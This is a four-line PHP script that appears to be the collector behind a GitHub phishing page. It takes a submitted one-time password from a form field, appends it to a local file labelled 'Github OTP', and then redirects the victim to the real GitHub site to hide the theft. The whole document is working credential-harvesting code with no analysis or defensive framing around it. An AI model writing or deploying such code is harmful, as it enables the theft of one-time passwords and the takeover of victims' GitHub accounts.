<?php
file_put_contents("otp.txt", "Github OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.github.com/');
?>
